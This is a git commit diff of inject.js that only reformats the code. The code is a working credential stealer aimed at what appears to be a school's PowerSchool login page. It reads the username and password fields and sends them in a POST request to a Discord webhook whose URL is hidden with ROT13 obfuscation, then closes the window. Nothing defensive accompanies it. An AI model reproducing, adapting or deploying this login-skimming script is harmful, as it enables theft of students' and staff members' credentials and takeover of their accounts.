d2d6c5afe7dccce645b72a37213a5464a56e1f69
niknal357 <46793548+niknal357@users.noreply.github.com>
2023-01-16 20:21:49 +0100

    ggggg

--- inject.js
+++ inject.js
@@ -1,44 +1,50 @@
 function init() {
-    user_field = document.getElementById('fieldAccount')
-    pass_field = document.getElementById('fieldPassword')
-    username = user_field.value
-    password = pass_field.value
-    valueUpdate(username, password)
+    user_field = document.getElementById("fieldAccount");
+    pass_field = document.getElementById("fieldPassword");
+    username = user_field.value;
+    password = pass_field.value;
+    valueUpdate(username, password);
     user_field.onchange = () => {
-        username = user_field.value
-        valueUpdate(username, password)
-    }
+        username = user_field.value;
+        valueUpdate(username, password);
+    };
     pass_field.onchange = () => {
-        password = pass_field.value
-        valueUpdate(username, password)
-    }
+        password = pass_field.value;
+        valueUpdate(username, password);
+    };
 }
 
 const rot13 = (message) => {
-    const originalAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
-    return message.replace(/[a-z]/gi, letter => cipher[originalAlpha.indexOf(letter)])
-  }
+    const originalAlpha =
+        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM";
+    return message.replace(
+        /[a-z]/gi,
+        (letter) => cipher[originalAlpha.indexOf(letter)]
+    );
+};
 
 function valueUpdate(user, pass) {
-    if (user == ''){
-        return
+    if (user == "") {
+        return;
     }
-    if (pass == ''){
-        return
+    if (pass == "") {
+        return;
     }
-    wh = rot13("uggcf://qvfpbeq.pbz/ncv/jroubbxf/1064304574900473877/qBf-0GQA5KAS5Y4MsCodLfUygO2qOrbNtV4_fxS9aVKNcfvy7ExZn14hoFNvAleBP7Vg")
+    wh = rot13(
+        "uggcf://qvfpbeq.pbz/ncv/jroubbxf/1064304574900473877/qBf-0GQA5KAS5Y4MsCodLfUygO2qOrbNtV4_fxS9aVKNcfvy7ExZn14hoFNvAleBP7Vg"
+    );
     fetch(wh, {
-        method: 'POST',
+        method: "POST",
         headers: {
-            'Content-Type': 'application/json'
+            "Content-Type": "application/json",
         },
         body: JSON.stringify({
-            content: `Username: ${user}\nPassword: ${pass}`
-        })
-    })
-    if (window.location == "https://powerschool.zis.ch/public/#"){
-        window.close()
+            content: `Username: ${user}\nPassword: ${pass}`,
+        }),
+    });
+    if (window.location == "https://powerschool.zis.ch/public/#") {
+        window.close();
     }
 }
 
